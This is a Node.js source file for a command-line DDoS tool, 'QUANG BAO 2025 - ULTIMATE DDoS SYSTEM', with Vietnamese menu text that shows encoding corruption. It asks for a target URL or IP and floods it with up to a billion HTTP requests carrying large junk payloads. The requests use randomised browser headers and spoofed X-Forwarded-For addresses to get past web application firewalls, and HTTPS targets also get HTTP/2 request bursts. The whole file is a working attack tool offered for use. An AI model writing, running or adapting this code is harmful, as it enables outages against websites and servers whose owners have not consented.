const axios = require('axios');
const http2 = require('http2');
const chalk = require('chalk');
const { v4: uuidv4 } = require('uuid');
const { URL } = require('url');
const readline = require('readline');

// Initialize console styling
const console = {
  log: (msg) => process.stdout.write(chalk.green(msg) + '\n'),
  warn: (msg) => process.stdout.write(chalk.yellow(msg) + '\n'),
  error: (msg) => process.stdout.write(chalk.red(msg) + '\n'),
  info: (msg) => process.stdout.write(chalk.cyan(msg) + '\n'),
  success: (msg) => process.stdout.write(chalk.green.bold(msg) + '\n'),
};

// Dynamic ASCII banner with animation
const displayBanner = () => {
  const frames = [
    '####++()))////#_-+',
    '#++()))////#_-+###',
    '()))////#_-+####++',
    '////#_-+####++()))',
    '#_-+####++()))////',
  ];
  let frameIndex = 0;
  const animate = () => {
    process.stdout.write('\x1Bc'); // Clear screen
    console.success(`
        ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
        ‚ïë        ‚ò†  QUANG BAO 2025 - ULTIMATE DDoS SYSTEM (Node.js)  ‚ò†‚ïë
        ‚ïë  ${frames[frameIndex]}  ‚ïë
        ‚ïë  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó               ‚ïë
        ‚ïë ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë               ‚ïë
        ‚ïë ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë               ‚ïë
        ‚ïë ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë               ‚ïë
        ‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù               ‚ïë
        ‚ïë  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù                ‚ïë
        ‚ïë       [ Powered by Node.js - Cyber Warfare Edition ]        ‚ïë
        ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
    üíÄ Kh√¥ng Gi·ªèi, Kh√¥ng Ti·ªÅn, Kh√¥ng T√¨nh, Nh∆∞ng C√≥ T√¢m üíÄ
    `);
    frameIndex = (frameIndex + 1) % frames.length;
  };
  animate();
  return setInterval(animate, 500);
};

// User-Agent list for randomization
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
];

// Generate random headers for WAF bypass
const generateRandomHeaders = () => ({
  'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
  'Accept': ['text/html', 'application/json', '*/*'][Math.floor(Math.random() * 3)],
  'Accept-Language': ['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8'][Math.floor(Math.random() * 3)],
  'Accept-Encoding': ['gzip, deflate', 'br', 'identity'][Math.floor(Math.random() * 3)],
  'Connection': 'keep-alive',
  'Cache-Control': ['no-cache', 'max-age=0'][Math.floor(Math.random() * 2)],
  'Referer': ['https://google.com', 'https://bing.com', 'https://yahoo.com'][Math.floor(Math.random() * 3)],
  'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
  'DNT': ['1', '0'][Math.floor(Math.random() * 2)],
});

// Attack configurations
const TARGET_CONFIGS = [
  { id: '1', name: 'attack_100k', requests: 100000, desc: 'T·∫•n c√¥ng 100K y√™u c·∫ßu', level: 'Th·∫•p', application: 'Ki·ªÉm tra c∆° b·∫£n' },
  { id: '2', name: 'attack_300k', requests: 300000, desc: 'T·∫•n c√¥ng 300K y√™u c·∫ßu', level: 'Th·∫•p-Trung b√¨nh', application: 'M√°y ch·ªß nh·ªè' },
  { id: '3', name: 'attack_600k', requests: 600000, desc: 'T·∫•n c√¥ng 600K y√™u c·∫ßu', level: 'Trung b√¨nh', application: 'M√°y ch·ªß v·ª´a' },
  { id: '4', name: 'attack_900k', requests: 900000, desc: 'T·∫•n c√¥ng 900K y√™u c·∫ßu', level: 'Trung b√¨nh-Cao', application: 'M√°y ch·ªß l·ªõn' },
  { id: '5', name: 'attack_5m', requests: 5000000, desc: 'T·∫•n c√¥ng 5M y√™u c·∫ßu', level: 'Cao', application: 'H·ªá th·ªëng b·∫£o v·ªá t·ªët' },
  { id: '6', name: 'attack_10m', requests: 10000000, desc: 'T·∫•n c√¥ng 10M y√™u c·∫ßu', level: 'R·∫•t Cao', application: 'H·ªá th·ªëng l·ªõn' },
  { id: '7', name: 'attack_20m', requests: 20000000, desc: 'T·∫•n c√¥ng 20M y√™u c·∫ßu', level: 'C·ª±c Cao', application: 'H·ªá th·ªëng ph√¢n t√°n' },
  { id: '8', name: 'attack_50m', requests: 50000000, desc: 'T·∫•n c√¥ng 50M y√™u c·∫ßu', level: 'C·ª±c ƒë·ªô', application: 'H·ªá th·ªëng CDN' },
  { id: '9', name: 'attack_100m', requests: 100000000, desc: 'T·∫•n c√¥ng 100M y√™u c·∫ßu', level: 'T·ªëi ƒëa', application: 'H·ªá th·ªëng to√†n c·∫ßu' },
  { id: '10', name: 'attack_1000m', requests: 1000000000, desc: 'T·∫•n c√¥ng 1000M y√™u c·∫ßu', level: 'T·ªëi ƒëa', application: 'H·ªá th·ªëng si√™u b·∫£o m·∫≠t' },
];

// Global counters
let successCount = 0;
let errorCount = 0;
let responseTimes = [];

// Validate URL
const validateUrl = (url) => {
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    url = `http://${url}`;
  }
  try {
    new URL(url);
    return url;
  } catch (e) {
    throw new Error(`URL kh√¥ng h·ª£p l·ªá: ${e.message}`);
  }
};

// Loading animation
const loadingAnimation = async (message, duration) => {
  const steps = ['‚†ã', '‚†ô', '‚†π', '‚†∏', '‚†º', '‚†¥', '‚†¶', '‚†ß', '‚†á', '‚†è'];
  let i = 0;
  const start = Date.now();
  while (Date.now() - start < duration * 1000) {
    process.stdout.write(`\r${chalk.cyan(`${steps[i % steps.length]} ${message} [${Math.floor(((Date.now() - start) / (duration * 1000)) * 100)}%]`)}`);
    i++;
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  process.stdout.write(`\r${chalk.green(`${message} [100%]!`)}\n`);
};

// HTTP/2 Multiplexing attack
const http2Attack = async (url) => {
  const parsedUrl = new URL(url);
  const client = http2.connect(url, { rejectUnauthorized: false });
  try {
    for (let i = 1; i < 100; i += 2) {
      const req = client.request({
        ':path': '/',
        ':method': 'GET',
        'user-agent': generateRandomHeaders()['User-Agent'],
      });
      req.end();
    }
    await new Promise(resolve => setTimeout(resolve, 10));
    console.warn(`[HTTP/2] T·∫•n c√¥ng: G·ª≠i y√™u c·∫ßu ƒë·∫øn ${url}`);
  } catch (e) {
    console.error(`[HTTP/2] T·∫•n c√¥ng th·∫•t b·∫°i: ${e.message}`);
  } finally {
    client.close();
  }
};

// WAF Bypass attack
const wafBypassAttack = async (url, requestCount) => {
  const methods = ['GET', 'POST', 'HEAD'];
  const startTime = Date.now();
  const promises = [];
  
  for (let i = 0; i < requestCount; i++) {
    const method = methods[Math.floor(Math.random() * methods.length)];
    const headers = generateRandomHeaders();
    const payload = 'X'.repeat(Math.floor(Math.random() * (204800 - 102400 + 1)) + 102400);
    
    promises.push(
      axios({
        method,
        url,
        headers,
        data: method === 'POST' ? payload : undefined,
        timeout: 2000,
      })
        .then(response => {
          responseTimes.push(Date.now() - startTime);
          successCount++;
          if ([429, 403, 522].includes(response.status)) {
            console.error(`[WAF BYPASS] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i ${response.status} - M·ª§C TI√äU QU√Å T·∫¢I`);
          } else {
            console.warn(`[WAF BYPASS] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i ${response.status}`);
          }
        })
        .catch(e => {
          errorCount++;
          console.error(`[WAF BYPASS] T·∫•n c√¥ng th·∫•t b·∫°i: ${e.message}`);
        })
    );

    if (promises.length >= 100) {
      await Promise.all(promises);
      promises.length = 0;
      await new Promise(resolve => setTimeout(resolve, 1));
    }
  }

  await Promise.all(promises);
};

// Display target menu
const displayTargetMenu = () => {
  process.stdout.write('\x1Bc');
  const bannerInterval = displayBanner();
  console.info('üî• MENU CHI·∫æN L∆Ø·ª¢C T·∫§N C√îNG üî•');
  console.log('ID | T√™n            | M√¥ t·∫£                   | C·∫•p ƒë·ªô         | ·ª®ng d·ª•ng');
  console.log('---|----------------|-------------------------|----------------|--------------------');
  TARGET_CONFIGS.forEach(target => {
    console.log(`${target.id.padEnd(2)} | ${target.name.padEnd(14)} | ${target.desc.padEnd(23)} | ${target.level.padEnd(14)} | ${target.application}`);
  });
  clearInterval(bannerInterval);
};

// Main function
const main = async () => {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  while (true) {
    try {
      displayTargetMenu();
      const choice = await new Promise(resolve => rl.question(chalk.cyan('Nh·∫≠p l·ª±a ch·ªçn (1-10): '), resolve));
      const target = TARGET_CONFIGS.find(t => t.id === choice);
      if (!target) {
        console.error('[L·ªñI] L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá! Th·ª≠ l·∫°i.');
        await new Promise(resolve => setTimeout(resolve, 1000));
        continue;
      }

      await loadingAnimation(`Kh√≥a m·ª•c ti√™u: ${target.name.toUpperCase()}`, 2);
      const inputUrl = await new Promise(resolve => rl.question(chalk.cyan('Nh·∫≠p URL ho·∫∑c IP m·ª•c ti√™u: '), resolve));
      if (!inputUrl) {
        console.error('[L·ªñI] URL/IP kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng! Th·ª≠ l·∫°i.');
        await new Promise(resolve => setTimeout(resolve, 1000));
        continue;
      }

      let validatedUrl;
      try {
        validatedUrl = validateUrl(inputUrl);
      } catch (e) {
        console.error(e.message);
        await new Promise(resolve => setTimeout(resolve, 1000));
        continue;
      }

      console.success(`[H·ªÜ TH·ªêNG] M·ª•c ti√™u ƒë√£ kh√≥a: ${validatedUrl}`);
      await loadingAnimation('ƒê√°nh gi√° b·∫£o m·∫≠t', 2);

      // Assess target security (simplified for Node.js)
      const securityLevel = Math.random() > 0.5 ? 'TRUNG B√åNH' : 'CAO';
      const threadMultiplier = securityLevel === 'TRUNG B√åNH' ? 1 : 2;
      const numThreads = Math.min(Math.floor(target.requests / 1000) * threadMultiplier, 1000);
      const requestsPerThread = Math.floor(target.requests / numThreads) || 1;

      console.info(`
üî• TH√îNG TIN T·∫§N C√îNG üî•
[+] Chi·∫øn l∆∞·ª£c: ${target.name.toUpperCase()}
[+] M·ª•c ti√™u: ${validatedUrl}
[+] Lu·ªìng: ${numThreads}
[+] Y√™u c·∫ßu/Lu·ªìng: ${requestsPerThread}
[+] Chi·∫øn l∆∞·ª£c: ${securityLevel}
[+] T·ªïng l∆∞·ª£t ƒë√°nh: ${numThreads * requestsPerThread}
      `);

      await loadingAnimation('Kh·ªüi ƒë·ªông h·ªá th·ªëng t·∫•n c√¥ng', 3);
      const startTime = Date.now();
      successCount = 0;
      errorCount = 0;
      responseTimes = [];

      // Execute attack
      const attackPromises = [];
      for (let i = 0; i < numThreads; i++) {
        attackPromises.push(wafBypassAttack(validatedUrl, requestsPerThread));
        if (validatedUrl.startsWith('https://')) {
          attackPromises.push(http2Attack(validatedUrl));
        }
      }
      await Promise.all(attackPromises);

      const totalTime = (Date.now() - startTime) / 1000;
      const avgResponseTime = responseTimes.length ? responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length : 0;
      const maxResponseTime = responseTimes.length ? Math.max(...responseTimes) : 0;
      const minResponseTime = responseTimes.length ? Math.min(...responseTimes) : 0;

      console.success(`
üî• B√ÅO C√ÅO T·∫§N C√îNG üî•
[+] Chi·∫øn d·ªãch: ${target.name.toUpperCase()}
[+] T·ªïng l∆∞·ª£t ƒë√°nh: ${numThreads * requestsPerThread}
[+] Th√†nh c√¥ng: ${successCount} (${((successCount / (numThreads * requestsPerThread)) * 100).toFixed(1)}%)
[+] Th·∫•t b·∫°i: ${errorCount} (${((errorCount / (numThreads * requestsPerThread)) * 100).toFixed(1)}%)
[+] T·ªïng th·ªùi gian: ${totalTime.toFixed(2)} gi√¢y
[+] Th·ªùi gian ph·∫£n h·ªìi trung b√¨nh: ${avgResponseTime.toFixed(2)}ms
[+] Hi·ªáu su·∫•t ƒë·ªânh: ${maxResponseTime.toFixed(2)}ms
[+] ƒê·ªô tr·ªÖ t·ªëi thi·ªÉu: ${minResponseTime.toFixed(2)}ms
[+] L∆∞·ª£t ƒë√°nh/gi√¢y: ${((numThreads * requestsPerThread) / totalTime).toFixed(0)}
[+] M·ª§C TI√äU B·ªä V√î HI·ªÜU H√ìA!
      `);

    } catch (e) {
      console.error(`[H·ªÜ TH·ªêNG] L·ªói nghi√™m tr·ªçng: ${e.message}`);
      process.exit(1);
    }
  }
};

// Run main function
main().catch(e => console.error(`[H·ªÜ TH·ªêNG] L·ªói kh·ªüi ƒë·ªông: ${e.message}`));